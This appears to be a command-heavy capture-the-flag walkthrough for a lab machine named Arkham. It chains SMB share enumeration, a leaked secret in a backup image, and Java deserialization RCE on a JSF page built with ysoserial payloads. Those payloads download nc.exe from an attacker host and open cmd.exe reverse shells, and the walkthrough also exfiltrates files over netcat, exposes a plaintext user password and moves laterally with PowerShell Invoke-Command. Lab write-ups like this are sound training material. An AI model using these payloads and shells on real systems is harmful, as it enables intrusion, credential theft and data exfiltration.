/css (Status: 302)
/fonts (Status: 302)
/images (Status: 302)
/index.html (Status: 200)
/js (Status: 302)


echo exit | smbclient -L \\\\10.10.10.130

Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------

	ADMIN$          Disk      Remote Admin
	BatShare        Disk      Master Wayne's secrets
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      

Reconnecting with SMB1 for workgroup listing.

You will get one .img file from Batshare. use binwalk -e to extract it, then go to appserver/_backup.img.extracted/825A23/Mask/tomcat-stuff/web.xml.bak there you will get 

secret: SnNGOTg3Ni0=(JsF9876-), algorithm: HmacSHA1, hex_of_key: 4a7346393837362d

http://10.10.10.130:8080/userSubscribe.faces, There is hmacsha1 value there will lead to RCE.


https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf

https://github.com/frohoff/ysoserial

https://gist.github.com/cdowns71/76d99ad0829ceef3a83761dbeee3b66d

`java -jar ysoserial.jar CommonsCollections5 'ping -n 3 ip' > ping.bin`

`openssl enc -des-ecb -K 4a7346393837362d -in ping.bin -out ping.bin.enc`

`python hmac_base64.py`

`base64 -d <<<abXMqIAUzdaQA25mFb1ovRxccCw= >> ping.bin.enc`

`openssl enc -base64 -in ping.bin.enc -out ping.bin.enc.b64`

`cat ping.bin.enc.b64`


url encode and use it.


`java -jar ysoserial.jar CommonsCollections5 'Powershell "Invoke-WebRequest -Uri http://ip:8081/nc.exe -OutFile nc.exe"'> ping.bin`

`openssl enc -des-ecb -K 4a7346393837362d -in ping.bin -out ping.bin.enc`

`python hmac_base64.py `

`base64 -d <<< ArqWVb1VFRSsNaUqCAuW9tqJj4Y= >>ping.bin.enc`

`openssl enc -base64 -in ping.bin.enc -out ping.bin.enc.b64`

`cat ping.bin.enc.b64`

url encode and use it.


`java -jar ysoserial.jar CommonsCollections5 'nc.exe ip 5546 -e cmd.exe"' >ping.bin`

`openssl enc -des-ecb -K 4a7346393837362d -in ping.bin -out ping.bin.enc`

`python hmac_base64.py`

`base64 -d <<< pGm5fNa37T+rO7I4kPVOH5HokpE= >> ping.bin.enc`

`openssl enc -base64 -in ping.bin.enc -out ping.bin.enc.b64`

`cat ping.bin.enc.b64`

url encode and use it.


`Powershell "Invoke-WebRequest -Uri http://ip:8081/JAWS/jaws-enum.ps1 -OutFile jaws-enum.ps1"`

`powershell -File jaws-enum.ps1`


`nc -l -p 5547 > backup.zip (receiver end)`

`C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe -w 3 ip 5547 < backup.zip (sender)`

`readpst outlook_folder`

you will get base64 encoded image then decode it, it will show you the password of batman

`batman:Zx^#QZX+T!123`


`$username = 'batman';`

`$password = 'Zx^#QZX+T!123';`

`$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;`

`$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword`

`Invoke-Command -ComputerName ARKHAM -Credential $credential -ScriptBlock {C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe ip 5547 -e cmd.exe}`

It will give you reverse connection.

net use E: \\ARKHAM\C$

E:

cd Users\Administrator\Desktop

more root.txt
